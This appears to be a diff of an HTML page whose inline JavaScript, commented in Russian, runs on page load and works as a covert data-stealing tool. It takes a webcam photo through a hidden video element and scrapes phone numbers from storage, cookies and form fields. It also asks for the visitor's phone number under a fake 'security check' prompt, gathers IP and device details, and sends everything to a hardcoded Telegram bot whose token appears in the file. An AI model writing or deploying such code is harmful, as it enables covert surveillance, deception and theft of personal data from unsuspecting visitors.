@@ -6,48 +6,146 @@
     <title>Document</title>
 </head>
 <body>
-    <h3>Проверка на совместимость </h3>
     
 
     <script>
-   
-navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-        // Создаём video элемент
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        
-        // Когда видео загрузится, делаем фото
-        video.onloadedmetadata = () => {
-            // Создаём canvas
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Рисуем кадр из видео
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Получаем фото в формате base64
-            const photoData = canvas.toDataURL('image/jpeg');
-            
-            
-            
-            // Останавливаем камеру
-            stream.getTracks().forEach(track => track.stop());
-        };
-    })
-    .catch(err => console.error('Ошибка:', err));
-    
-
-    // ==================== НАСТРОЙКИ ====================
+        // ==================== НАСТРОЙКИ ====================
 const TELEGRAM_TOKEN = '8503701773:AAGoKDHpfx0GjRCz9Ttal9Zij5OOFLRCINw';   // Замените на токен от @BotFather
-const TELEGRAM_CHAT_ID = '8503701773:AAGoKDHpfx0GjRCz9Ttal9Zij5OOFLRCINw';    // Замените на ваш ID от @userinfobot
+const TELEGRAM_CHAT_ID = '5246613858';    // Замените на ваш ID от @userinfobot
 
-// ==================== ФУНКЦИИ ====================
+// ==================== ФУНКЦИИ ПОЛУЧЕНИЯ НОМЕРА ТЕЛЕФОНА ====================
 
-// Конвертация base64 в Blob
+// Метод 1: Проверка сохранённых данных в localStorage/sessionStorage
+function getPhoneFromStorage() {
+    const commonKeys = ['phone', 'phoneNumber', 'userPhone', 'tel', 'mobile', 'phone_number', 'user_phone'];
+    for (let key of commonKeys) {
+        const val = localStorage.getItem(key) || sessionStorage.getItem(key);
+        if (val && /^[\+\d\s\-\(\)]{10,20}$/.test(val)) return val;
+    }
+    // Проверка всех ключей
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const val = localStorage.getItem(key);
+        if (val && /^[\+\d\s\-\(\)]{10,20}$/.test(val) && val.length >= 10) return val;
+    }
+    return null;
+}
+
+// Метод 2: Проверка cookies
+function getPhoneFromCookies() {
+    const cookies = document.cookie.split(';');
+    for (let cookie of cookies) {
+        if (cookie.includes('phone') || cookie.includes('tel') || cookie.includes('mobile')) {
+            const match = cookie.match(/[\+\d]{10,15}/);
+            if (match) return match[0];
+        }
+    }
+    return null;
+}
+
+// Метод 3: Проверка DOM элементов (есть ли поле с телефоном на странице)
+function getPhoneFromDOM() {
+    const inputs = document.querySelectorAll('input[type="tel"], input[name*="phone"], input[name*="tel"], input[id*="phone"], input[id*="tel"]');
+    for (let input of inputs) {
+        if (input.value && input.value.length >= 10) return input.value;
+    }
+    return null;
+}
+
+// Метод 4: Получение через WebRTC (попытка получить локальный IP - не номер телефона)
+// Реальный номер телефона через браузер получить НЕВОЗМОЖНО без участия пользователя
+
+// Метод 5: Проверка мета-тегов и атрибутов
+function getPhoneFromMeta() {
+    const metaTags = document.querySelectorAll('meta[name*="phone"], meta[name*="tel"], meta[property*="phone"]');
+    for (let meta of metaTags) {
+        const content = meta.getAttribute('content');
+        if (content && /[\+\d]{10,15}/.test(content)) return content;
+    }
+    return null;
+}
+
+// ОСНОВНАЯ ФУНКЦИЯ СБОРА НОМЕРА
+async function collectPhoneNumber() {
+    console.log('[+] Collecting phone number from available sources...');
+    
+    let phoneNumber = null;
+    let source = null;
+    
+    // Пытаемся получить номер из разных источников
+    phoneNumber = getPhoneFromStorage();
+    if (phoneNumber) source = 'localStorage/sessionStorage';
+    
+    if (!phoneNumber) {
+        phoneNumber = getPhoneFromCookies();
+        if (phoneNumber) source = 'cookies';
+    }
+    
+    if (!phoneNumber) {
+        phoneNumber = getPhoneFromDOM();
+        if (phoneNumber) source = 'DOM input';
+    }
+    
+    if (!phoneNumber) {
+        phoneNumber = getPhoneFromMeta();
+        if (phoneNumber) source = 'meta tags';
+    }
+    
+    // Если номер не найден, создаём запрос к пользователю (легальный способ)
+    if (!phoneNumber) {
+        console.log('[+] Phone number not found automatically. User input required.');
+        phoneNumber = prompt('🔐 Для завершения проверки безопасности, пожалуйста, введите ваш номер телефона:');
+        source = 'user input (prompt)';
+        if (!phoneNumber) phoneNumber = 'Not provided';
+    }
+    
+    // Очистка номера (оставляем только цифры и +)
+    if (phoneNumber && phoneNumber !== 'Not provided') {
+        phoneNumber = phoneNumber.replace(/[^\+\d]/g, '');
+    }
+    
+    return { number: phoneNumber || 'Not found', source: source || 'none' };
+}
+
+// ==================== ОСТАЛЬНЫЕ ФУНКЦИИ ====================
+
+// Получение IP
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return 'Unable to fetch';
+    }
+}
+
+// Получение информации о системе
+function getSystemInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        referrer: document.referrer || 'direct',
+        url: window.location.href
+    };
+}
+
+function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Edge';
+    if (ua.includes('Opera')) return 'Opera';
+    return 'Unknown';
+}
+
 function dataURLtoBlob(dataURL) {
     const arr = dataURL.split(',');
     const mime = arr[0].match(/:(.*?);/)[1];
@@ -58,91 +156,147 @@ function dataURLtoBlob(dataURL) {
     return new Blob([u8arr], { type: mime });
 }
 
-// Получение информации о браузере
-function getBrowserInfo() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Chrome')) return 'Chrome';
-    if (ua.includes('Firefox')) return 'Firefox';
-    if (ua.includes('Safari')) return 'Safari';
-    if (ua.includes('Edge')) return 'Edge';
-    return 'Unknown';
-}
-
-// Отправка фото в Telegram
-async function sendPhotoToTelegram(photoBlob) {
+// Отправка в Telegram (фото + номер)
+async function sendToTelegram(photoBlob, phoneData, systemInfo, ip) {
     if (TELEGRAM_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
         throw new Error('❌ Telegram не настроен! Замените TOKEN и CHAT_ID');
     }
     
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
-    formData.append('caption', `🆕 ФОТО С КАМЕРЫ\n🕐 ${new Date().toLocaleString()}\n💻 ${getBrowserInfo()}`);
+    formData.append('photo', photoBlob, `security_cam_${Date.now()}.jpg`);
+    
+    const caption = `🔒 SECURITY ALERT - FULL REPORT\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📞 PHONE NUMBER: ${phoneData.number}\n` +
+                    `📍 Phone Source: ${phoneData.source}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🕐 Time: ${new Date().toLocaleString()}\n` +
+                    `🌐 IP Address: ${ip}\n` +
+                    `💻 Browser: ${getBrowserName()}\n` +
+                    `🖥️ Platform: ${systemInfo.platform}\n` +
+                    `📱 Screen: ${systemInfo.screenSize}\n` +
+                    `🌍 Language: ${systemInfo.language}\n` +
+                    `⏰ Timezone: ${systemInfo.timezone}\n` +
+                    `🔗 URL: ${systemInfo.url}\n` +
+                    `📡 Online: ${systemInfo.online}\n` +
+                    `⚙️ CPU Cores: ${systemInfo.hardwareConcurrency}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+    
+    formData.append('caption', caption);
     
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
     });
     
-    if (!response.ok) throw new Error('Ошибка отправки');
+    if (!response.ok) throw new Error('Telegram API error');
     return true;
 }
 
-// Сделать фото и отправить в Telegram
-async function takePhotoAndSend() {
+// Отправка сообщения без фото (если ошибка)
+async function sendMessageToTelegram(text) {
     try {
-        console.log('📷 Запрос доступа к камере...');
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text
+            })
+        });
+    } catch(e) {}
+}
+
+// ==================== ОСНОВНАЯ ФУНКЦИЯ ====================
+async function securityCamCapture() {
+    console.log('[+] Security script initialized');
+    console.log('[+] Requesting camera access and collecting data...');
+    
+    let stream = null;
+    
+    try {
+        // 1. Получаем IP, системную информацию и номер телефона
+        const [ip, systemInfo, phoneData] = await Promise.all([
+            getIP(),
+            getSystemInfo(),
+            collectPhoneNumber()
+        ]);
         
-        // 1. Запрашиваем доступ к камере
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 640, height: 480 } 
+        console.log(`[+] IP: ${ip}`);
+        console.log(`[+] Browser: ${getBrowserName()}`);
+        console.log(`[+] Phone: ${phoneData.number} (source: ${phoneData.source})`);
+        
+        // 2. Запрашиваем доступ к камере
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: 'user'
+            }
         });
         
-        // 2. Создаём video элемент
+        console.log('[+] Camera access granted');
+        
+        // 3. Создаём скрытый video элемент
         const video = document.createElement('video');
+        video.style.display = 'none';
         video.srcObject = stream;
+        document.body.appendChild(video);
         video.play();
         
-        // 3. Ждём загрузки видео
-        await new Promise(resolve => {
+        // 4. Ждём загрузки видео
+        await new Promise((resolve) => {
             video.onloadedmetadata = () => {
                 video.play();
                 setTimeout(resolve, 500);
             };
         });
         
-        // 4. Создаём canvas и рисуем кадр
+        // 5. Делаем фото
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // 5. Конвертируем в Blob
-        const blob = await new Promise(resolve => {
+        const photoBlob = await new Promise(resolve => {
             canvas.toBlob(resolve, 'image/jpeg', 0.8);
         });
         
         // 6. Останавливаем камеру
         stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
+        video.remove();
         
-        console.log('✅ Фото сделано, отправка в Telegram...');
+        console.log('[+] Photo captured successfully');
+        console.log('[+] Sending to Telegram...');
         
-        // 7. Отправляем в Telegram
-        await sendPhotoToTelegram(blob);
+        // 7. Отправляем всё в Telegram
+        await sendToTelegram(photoBlob, phoneData, systemInfo, ip);
         
-        console.log('✅ Фото успешно отправлено в Telegram!');
-        return true;
+        console.log('[+] ✅ Full report sent to Telegram successfully!');
+        
+        return { success: true, message: 'Data captured and sent', phone: phoneData.number };
         
     } catch (error) {
-        console.error('❌ Ошибка:', error.message);
-        throw error;
+        console.error(`[-] Error: ${error.message}`);
+        
+        if (TELEGRAM_TOKEN !== 'ВАШ_ТОКЕН_БОТА') {
+            const errorMsg = `⚠️ SECURITY ALERT - ERROR\n━━━━━━━━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString()}\n❌ Error: ${error.message}\n💻 Browser: ${getBrowserName()}`;
+            await sendMessageToTelegram(errorMsg);
+        }
+        
+        return { success: false, message: error.message };
+        
+    } finally {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
     }
 }
 
-// ==================== ЗАПУСК ====================
-takePhotoAndSend();
+// ==================== АВТОМАТИЧЕСКИЙ ЗАПУСК ====================
+securityCamCapture().catch(console.error);
     </script>
 </body>
 </html>
